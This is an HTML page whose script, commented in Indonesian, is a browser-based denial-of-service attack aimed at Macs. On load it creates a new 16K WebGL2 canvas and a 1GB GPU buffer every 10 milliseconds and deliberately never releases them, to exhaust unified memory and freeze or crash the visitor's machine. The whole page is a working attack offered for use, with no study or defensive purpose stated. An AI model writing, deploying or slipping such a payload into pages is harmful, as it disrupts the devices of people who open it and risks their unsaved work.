<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GPU Process Exhaustion (macOS)</title>
<style>
  body { background: #000; color: #f00; overflow: hidden; font-family: monospace; text-align: center; padding-top: 20vh; }
  canvas { display: none; }
</style>
</head>
<body>
<h1>🔥 GPU PROCESS OVERLOAD 🔥</h1>
<p id="status">Mengalokasikan VRAM Apple Silicon...</p>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');
  var contextCount = 0;
  var contexts = [];
  
  // Mendeteksi apakah ini Mac (Apple Silicon / Intel)
  var isMac = navigator.platform.toUpperCase().indexOf('MAC') >= 0;
  var isAppleSilicon = isMac && (navigator.userAgent.indexOf('Mac OS X 10_15') > -1 || navigator.hardwareConcurrency >= 8);

  // ============================================
  // FUNGSI PENGHANCUR GPU (MAC OPTIMIZED)
  // ============================================
  function floodGPU() {
    try {
      // 1. Buat Canvas dengan resolusi maksimal (Apple GPU sangat cepat memproses ini,
      // jadi kita paksa menggunakan alokasi VRAM sebesar mungkin)
      var canvas = document.createElement('canvas');
      canvas.width = 16384;  // Batas maksimal tekstur (MacBook Pro M1/M2/M3 mendukung 16K)
      canvas.height = 16384;

      // 2. Pilih API (WebGL 2.0)
      var gl = canvas.getContext('webgl2', {
        antialias: false,
        depth: true,
        stencil: false,
        alpha: false,
        preserveDrawingBuffer: true,
        powerPreference: "high-performance"
      });

      if (!gl) return;

      // 3. Alokasi ArrayBuffer Besar (1GB per context)
      // Apple Silicon Unified Memory: RAM dan VRAM adalah satu.
      // Mengalokasikan VRAM di sini akan memakan RAM sistem.
      var buffer = gl.createBuffer();
      gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
      
      var size = 256 * 1024 * 1024; // 256 juta float (1GB)
      var data = new Float32Array(size);
      gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);

      // 4. Paksa GPU untuk merender (Shader Compilation & Draw Call)
      var vsSource = `attribute vec4 aVertexPosition; void main() { gl_Position = aVertexPosition; }`;
      var fsSource = `void main() { gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); }`;
      
      var shader = gl.createShader(gl.VERTEX_SHADER);
      gl.shaderSource(shader, vsSource);
      gl.compileShader(shader);
      
      var program = gl.createProgram();
      gl.attachShader(program, shader);
      gl.linkProgram(program);
      gl.useProgram(program);
      
      // 5. Gambar ratusan ribu kali untuk memaksa GPU bekerja
      gl.drawArrays(gl.TRIANGLES, 0, 3);
      
      // JANGAN HAPUS BUFFER/CONTEXT (Memory Leak)
      contexts.push(gl);
      contextCount++;

      statusEl.innerText = "WebGL Contexts Allocated: " + contextCount;

      if (contextCount % 100 === 0) {
        console.log("[!] GPU Contexts: " + contextCount);
      }

    } catch (e) {
      console.log("GPU Error (Expected when VRAM full):", e.message);
    }

    // 6. Loop super cepat (setiap 10ms)
    setTimeout(floodGPU, 10); 
  }

  // ============================================
  // EKSEKUSI
  // ============================================
  setTimeout(floodGPU, 500);

})();
</script>
</body>
</html>
